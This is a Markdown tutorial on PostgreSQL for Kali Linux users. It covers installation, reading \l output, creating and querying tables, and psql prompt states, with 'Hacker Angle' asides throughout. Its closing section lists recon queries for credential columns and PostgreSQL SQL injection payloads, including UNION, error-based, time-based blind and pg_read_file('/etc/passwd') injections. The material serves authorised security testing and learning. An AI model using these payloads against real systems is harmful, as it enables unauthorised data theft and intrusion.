# 🐘 PostgreSQL on Kali Linux — Field Guide
> *For bug bounty hunters, pentesters, and developers alike.*

---

## Table of Contents
- [What is PostgreSQL?](#what-is-postgresql)
- [Installing PostgreSQL on Kali Linux](#installing-postgresql-on-kali-linux)
- [Understanding the `\l` Output](#understanding-the-l-output)
- [Creating & Managing a Database](#creating--managing-a-database)
- [Inserting & Querying Data](#inserting--querying-data)
- [The psql Prompt — What It's Telling You](#the-psql-prompt--what-its-telling-you)
- [Common Mistakes & Fixes](#common-mistakes--fixes)
- [Hacker Notes 🕵️](#hacker-notes-)

---

## What is PostgreSQL?

PostgreSQL (a.k.a. **Postgres**) is an open-source, enterprise-grade **Relational Database Management System (RDBMS)**. It speaks SQL, handles massive data, and is trusted by startups and Fortune 500s alike.

| Feature | What It Means |
|---|---|
| **SQL Compliance** | Follows the SQL standard closely — skills transfer across DBs |
| **Transactions** | All-or-nothing operations (critical for data integrity) |
| **Concurrency Control** | Multiple users can read/write without stepping on each other |
| **Extensibility** | Custom types, functions, even custom languages |
| **Role-Based Access Control** | Fine-grained permissions — users can be locked down tightly |
| **Encryption** | Protects data at rest and in transit |

### Common Use Cases

| Use Case | Example |
|---|---|
| Web Applications | E-commerce, CMS, social platforms |
| Business Intelligence | Large dataset analysis & reporting |
| Geospatial (PostGIS) | Location services, GIS mapping |
| Scientific Research | Genomic data, astronomical observations |

> 🕵️ **Hacker Angle:** PostgreSQL is one of the most commonly found databases in web application stacks. If you find a SQLi vulnerability or misconfigured credentials in a bug bounty target, there's a solid chance you're talking to Postgres. Knowing its internals is your edge.

---

## Installing PostgreSQL on Kali Linux

Kali is Debian-based, so `apt` handles everything cleanly.

```bash
# Step 1: Refresh package lists
apt-get update

# Step 2: Install PostgreSQL server + contrib tools
apt-get install -y postgresql postgresql-contrib

# Step 3: Confirm installation
psql --version
```

> The `-y` flag skips the "Are you sure?" prompt — useful in scripts and automated setups.

> `postgresql-contrib` adds extra utilities and extensions on top of the base install.

> 🕵️ **Hacker Angle:** When you get RCE or shell access on a target, `psql --version` tells you instantly what version is running. Older versions have known CVEs. Always check the version before you craft your next move.

---

## Understanding the `\l` Output

Run `\l` inside psql to list all databases:

```
postgres=# \l
```

```
                                                 List of databases
   Name    |  Owner   | Encoding | Locale Provider | Collate |  Ctype  | Locale | ICU Rules |   Access privileges
-----------+----------+----------+-----------------+---------+---------+--------+-----------+-----------------------
 postgres  | postgres | UTF8     | libc            | C.UTF-8 | C.UTF-8 |        |
 template0 | postgres | UTF8     | libc            | C.UTF-8 | C.UTF-8 |        |           | =c/postgres +
           |          |          |                 |         |         |        |           | postgres=CTc/postgres
 template1 | postgres | UTF8     | libc            | C.UTF-8 | C.UTF-8 |        |           | =c/postgres +
           |          |          |                 |         |         |        |           | postgres=CTc/postgres
```

### Column-by-Column Breakdown

| Column | What It Means |
|---|---|
| **Name** | The database name |
| **Owner** | The PostgreSQL role/user who owns it |
| **Encoding** | Character encoding (`UTF8` = supports all languages/emojis) |
| **Locale Provider** | How locale (language/region rules) is managed (`libc` = system C library) |
| **Collate** | Sorting rules for text (`C.UTF-8` = byte-order sorting, fast and predictable) |
| **Ctype** | Character classification rules (used for `UPPER`, `LOWER`, etc.) |
| **Locale** | ICU locale string (empty = using libc instead) |
| **ICU Rules** | Custom ICU collation rules (empty = using defaults) |
| **Access Privileges** | Who can do what — the ACL (Access Control List) |

### The Three Default Databases

| Database | Purpose |
|---|---|
| `postgres` | Default DB for the `postgres` superuser. Used for admin tasks. |
| `template0` | A pristine, unmodifiable template. Used when you need a clean baseline (e.g., restoring from dump). |
| `template1` | The default template used when creating new databases. You can add objects here and they'll be cloned into every new DB. |

### Decoding Access Privileges

```
=c/postgres          → Public (anyone) can CONNECT; granted by postgres
postgres=CTc/postgres → The postgres user has: CREATE, TEMP, CONNECT on this DB
```

| Code | Privilege |
|---|---|
| `C` | CREATE (make schemas/tables) |
| `T` | TEMP (create temporary tables) |
| `c` | CONNECT (log into the database) |
| `=` before `/` | Grantee is PUBLIC (all users) |
| `username` before `=` | Specific user |
| after `/` | Who granted the privilege |

> 🕵️ **Hacker Angle:** The Access Privileges column is **gold** during a pentest. If you see `=c/postgres` on a sensitive database, it means **any** user can connect to it — no special role needed. That's a misconfiguration worth reporting in a bug bounty. Look for databases where PUBLIC has more than just `CONNECT`.

---

## Creating & Managing a Database

```bash
# Switch to the postgres system user
su - postgres

# Enter the psql prompt
psql
```

### Create a New Database

```sql
CREATE DATABASE cyberdb;
```

### Switch to It

```sql
\c cyberdb
```

Your prompt changes to `cyberdb=#` — you're now inside `cyberdb`.

### Create a Table

```sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) UNIQUE NOT NULL
);
```

| Column | Type | Constraint | What It Does |
|---|---|---|---|
| `id` | `SERIAL` | `PRIMARY KEY` | Auto-incrementing unique ID for each row |
| `username` | `VARCHAR(50)` | `UNIQUE NOT NULL` | Max 50 chars, must be unique, can't be empty |
| `email` | `VARCHAR(100)` | `UNIQUE NOT NULL` | Max 100 chars, must be unique, can't be empty |

### Verify Table Was Created

```sql
\dt
```

```
          List of tables
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | users | table | postgres
```

### Exit

```sql
\q
```

```bash
exit
```

> 🕵️ **Hacker Angle:** `\dt` (list tables) and `\d tablename` (describe a table) are your recon commands. During a pentest with DB access, these are the first things you run to map the attack surface — what tables exist, what columns hold passwords or tokens, what's worth exfiltrating. `information_schema.tables` gives you the same info via SQL if you're going through a SQLi vector.

---

## Inserting & Querying Data

```bash
su - postgres
psql -d cyberdb
```

### Insert Rows

```sql
INSERT INTO users (username, email) VALUES ('labex', 'info@labex.io');
-- Output: INSERT 0 1

INSERT INTO users (username, email) VALUES ('kaliuser', 'kali@example.com');
-- Output: INSERT 0 1
```

> `INSERT 0 1` means: 0 rows affected by OID (old Postgres thing), 1 row inserted.

### Query All Data

```sql
SELECT * FROM users;
```

### Select Specific Columns

```sql
SELECT username FROM users;
```

### Filter with WHERE

```sql
SELECT * FROM users WHERE username = 'labex';
```

> 🕵️ **Hacker Angle — SQL Injection Mindset:**
> The query above is exactly what a vulnerable web app might build dynamically:
> ```
> SELECT * FROM users WHERE username = '[USER INPUT]';
> ```
> If the input isn't sanitized, an attacker inputs:
> ```
> ' OR '1'='1
> ```
> ...and suddenly gets ALL rows returned. In bug bounty:
> - Test every input field that talks to a DB
> - Try `'`, `''`, `' OR 1=1--`, `' UNION SELECT null--`
> - Watch for error messages that leak table/column names (error-based SQLi)
> - Use Blind SQLi payloads if no errors are returned

---

## The psql Prompt — What It's Telling You

The prompt is your **status indicator**. Never ignore it.

| Prompt | Meaning |
|---|---|
| `cyberdb=#` | Normal. Ready for a new command. You're good. |
| `cyberdb-#` | Waiting. You forgot a `;` somewhere. psql thinks your command isn't done. |
| `cyberdb'#` | Stuck inside an unclosed single quote `'` |
| `cyberdb"#` | Stuck inside an unclosed double quote `"` |

### How to Escape

```sql
-- If you're stuck at cyberdb-#, just add a semicolon and press Enter:
;

-- Or cancel entirely:
-- Press Ctrl+C
```

> **Rule:** Always end SQL statements with `;`

---

## Common Mistakes & Fixes

### ❌ Syntax Error from Wrong Prompt State

**What happened:**
You typed `CREATE TABLE` while the prompt showed `cyberdb-#` (continuation mode). psql thought you were still finishing a previous command, so it threw a syntax error.

**Fix:**
Always check your prompt before typing. If you see `-#` instead of `=#`, type `;` first to close the hanging statement, then start fresh.

```
cyberdb-# ;      ← closes the hanging statement
cyberdb=# CREATE TABLE ...;   ← now it works
```

### ❌ Command Ran Twice / Unexpected Behavior

You may have pressed Enter on a continuation prompt thinking the command ran. It didn't — psql was still waiting. Add `;` and Enter to execute.

---

## Hacker Notes 🕵️

> A quick reference for the offensive security mindset.

### Useful psql Recon Commands (Once You Have Access)

```sql
-- List all databases
\l

-- List all tables in current DB
\dt

-- Describe a table's structure
\d users

-- List all roles/users
\du

-- Current user and DB
SELECT current_user, current_database();

-- Check your privileges on a table
SELECT * FROM information_schema.role_table_grants WHERE table_name='users';

-- Dump all data from a table
SELECT * FROM users;

-- Find tables with 'password', 'token', 'secret' in column names
SELECT table_name, column_name
FROM information_schema.columns
WHERE column_name ILIKE '%password%'
   OR column_name ILIKE '%token%'
   OR column_name ILIKE '%secret%';
```

### PostgreSQL-Specific SQLi Payloads (For Bug Bounty Testing on Your Own Lab)

```sql
-- Basic OR bypass
' OR '1'='1

-- Comment-based
' OR 1=1--
' OR 1=1/*

-- UNION-based (find column count first)
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT null,null--

-- Error-based (leaks info in error messages)
' AND 1=CAST((SELECT version()) AS INT)--

-- Stacked queries (if allowed)
'; SELECT pg_sleep(5)--    ← time-based blind SQLi

-- Read files (requires superuser)
' UNION SELECT pg_read_file('/etc/passwd')--
```

> ⚠️ **Ethics Reminder:** Only use these on systems you own or have explicit written permission to test. Unauthorized testing is illegal.

### Checking for Dangerous Misconfigurations

```sql
-- Is PostgreSQL listening on all interfaces? (Check outside psql)
-- Run in bash:
ss -tnlp | grep 5432

-- Is the postgres user's password set? (blank = dangerous)
-- Inside psql:
SELECT rolname, rolpassword FROM pg_authid WHERE rolname = 'postgres';

-- Are there any users with superuser privileges you didn't create?
SELECT rolname, rolsuper FROM pg_roles WHERE rolsuper = true;
```

---

*Happy hacking (ethically) and happy building!* 🐘🔐
